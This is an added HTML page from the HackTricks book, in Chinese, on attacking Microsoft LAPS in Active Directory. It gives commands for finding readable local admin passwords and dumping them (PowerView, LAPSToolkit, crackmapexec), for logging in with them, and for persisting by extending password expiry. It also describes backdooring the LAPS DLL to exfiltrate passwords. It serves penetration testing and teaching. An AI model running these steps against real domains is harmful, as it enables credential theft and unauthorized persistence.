@@ -1,0 +1,337 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>LAPS</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="laps"><a class="header" href="#laps">LAPS</a></h1>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<p>{% embed url="https://websec.nl/" %}</p>
+<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
+<p>本地管理员密码解决方案（LAPS）是一种用于管理系统的工具，其中<strong>管理员密码</strong>是<strong>唯一的、随机生成的，并且经常更改</strong>，适用于加入域的计算机。这些密码安全地存储在Active Directory中，仅对通过访问控制列表（ACL）获得权限的用户可访问。通过使用<strong>Kerberos版本5</strong>和**高级加密标准（AES）**确保从客户端到服务器的密码传输安全。</p>
+<p>在域的计算机对象中，LAPS的实施导致添加两个新属性：<strong><code>ms-mcs-AdmPwd</code><strong>和</strong><code>ms-mcs-AdmPwdExpirationTime</code></strong>。这些属性分别存储<strong>明文管理员密码</strong>和<strong>其过期时间</strong>。</p>
+<h3 id="检查是否已激活"><a class="header" href="#检查是否已激活">检查是否已激活</a></h3>
+<pre><code class="language-bash">reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+
+dir "C:\Program Files\LAPS\CSE"
+# Check if that folder exists and contains AdmPwd.dll
+
+# Find GPOs that have "LAPS" or some other descriptive term in the name
+Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
+
+# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
+Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
+</code></pre>
+<h3 id="laps-密码访问"><a class="header" href="#laps-密码访问">LAPS 密码访问</a></h3>
+<p>您可以从 <code>\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol</code> <strong>下载原始 LAPS 策略</strong>，然后使用 <a href="https://github.com/PowerShell/GPRegistryPolicyParser"><strong>GPRegistryPolicyParser</strong></a> 包中的 <strong><code>Parse-PolFile</code></strong> 将此文件转换为人类可读的格式。</p>
+<p>此外，如果在我们可以访问的机器上安装了 <strong>本地 LAPS PowerShell cmdlets</strong>，也可以使用它们：</p>
+<pre><code class="language-powershell">Get-Command *AdmPwd*
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
+Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
+Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
+Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
+
+# List who can read LAPS password of the given OU
+Find-AdmPwdExtendedRights -Identity Workstations | fl
+
+# Read the password
+Get-AdmPwdPassword -ComputerName wkstn-2 | fl
+</code></pre>
+<p><strong>PowerView</strong> 还可以用来找出 <strong>谁可以读取密码并读取它</strong>：</p>
+<pre><code class="language-powershell"># Find the principals that have ReadPropery on ms-Mcs-AdmPwd
+Get-AdmPwdPassword -ComputerName wkstn-2 | fl
+
+# Read the password
+Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
+</code></pre>
+<h3 id="lapstoolkit"><a class="header" href="#lapstoolkit">LAPSToolkit</a></h3>
+<p><a href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a> 通过几个功能促进了 LAPS 的枚举。<br />
+其中之一是解析 <strong><code>ExtendedRights</code></strong> 以获取 <strong>所有启用 LAPS 的计算机。</strong> 这将显示 <strong>专门被委派读取 LAPS 密码的组，</strong> 这些组通常是受保护组中的用户。<br />
+一个 <strong>已将计算机</strong> 加入域的 <strong>帐户</strong> 会获得该主机的 <code>All Extended Rights</code>，而这个权限赋予 <strong>帐户</strong> 读取 <strong>密码</strong> 的能力。枚举可能会显示一个可以读取主机上 LAPS 密码的用户帐户。这可以帮助我们 <strong>针对特定的 AD 用户</strong>，这些用户可以读取 LAPS 密码。</p>
+<pre><code class="language-powershell"># Get groups that can read passwords
+Find-LAPSDelegatedGroups
+
+OrgUnit                                           Delegated Groups
+-------                                           ----------------
+OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
+OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin
+
+# Checks the rights on each computer with LAPS enabled for any groups
+# with read access and users with "All Extended Rights"
+Find-AdmPwdExtendedRights
+ComputerName                Identity                    Reason
+------------                --------                    ------
+MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
+MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated
+
+# Get computers with LAPS enabled, expirations time and the password (if you have access)
+Get-LAPSComputers
+ComputerName                Password       Expiration
+------------                --------       ----------
+DC01.DOMAIN_NAME.LOCAL      j&amp;gR+A(s976Rf% 12/10/2022 13:24:41
+</code></pre>
+<h2 id="通过-crackmapexec-转储-laps-密码"><a class="header" href="#通过-crackmapexec-转储-laps-密码"><strong>通过 Crackmapexec 转储 LAPS 密码</strong></a></h2>
+<p>如果无法访问 PowerShell，您可以通过 LDAP 远程利用此权限。</p>
+<pre><code>crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
+</code></pre>
+<p>这将转储用户可以读取的所有密码，使您能够以不同的用户获得更好的立足点。</p>
+<h2 id="-使用-laps-密码-"><a class="header" href="#-使用-laps-密码-">** 使用 LAPS 密码 **</a></h2>
+<pre><code>xfreerdp /v:192.168.1.1:3389  /u:Administrator
+Password: 2Z@Ae)7!{9#Cq
+
+python psexec.py Administrator@web.example.com
+Password: 2Z@Ae)7!{9#Cq
+</code></pre>
+<h2 id="laps-持久性"><a class="header" href="#laps-持久性"><strong>LAPS 持久性</strong></a></h2>
+<h3 id="到期日期"><a class="header" href="#到期日期"><strong>到期日期</strong></a></h3>
+<p>一旦成为管理员，就可以<strong>获取密码</strong>并通过<strong>将到期日期设置为未来</strong>来<strong>防止</strong>机器<strong>更新</strong>其<strong>密码</strong>。</p>
+<pre><code class="language-powershell"># Get expiration time
+Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
+
+# Change expiration time
+## It's needed SYSTEM on the computer
+Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
+</code></pre>
+<p>{% hint style="warning" %}
+如果<strong>管理员</strong>使用**<code>Reset-AdmPwdPassword</code>** cmdlet，或者在LAPS GPO中启用了<strong>不允许密码过期时间超过政策要求</strong>，密码仍然会被重置。
+{% endhint %}</p>
+<h3 id="后门"><a class="header" href="#后门">后门</a></h3>
+<p>LAPS的原始源代码可以在<a href="https://github.com/GreyCorbel/admpwd">这里</a>找到，因此可以在代码中放置一个后门（例如在<code>Main/AdmPwd.PS/Main.cs</code>中的<code>Get-AdmPwdPassword</code>方法内），以某种方式<strong>外泄新密码或将其存储在某处</strong>。</p>
+<p>然后，只需编译新的<code>AdmPwd.PS.dll</code>并将其上传到机器的<code>C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll</code>（并更改修改时间）。</p>
+<h2 id="参考"><a class="header" href="#参考">参考</a></h2>
+<ul>
+<li><a href="https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/">https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/</a></li>
+</ul>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<p>{% embed url="https://websec.nl/" %}</p>
+<p>{% hint style="success" %}
+学习和实践AWS黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks培训AWS红队专家（ARTE）</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践GCP黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks培训GCP红队专家（GRTE）</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持HackTricks</summary>
+<ul>
+<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord群组</strong></a>或<a href="https://t.me/peass"><strong>电报群组</strong></a>或<strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>上关注我们。</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github库提交PR来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/kerberos-double-hop-problem.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/kerberos-double-hop-problem.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
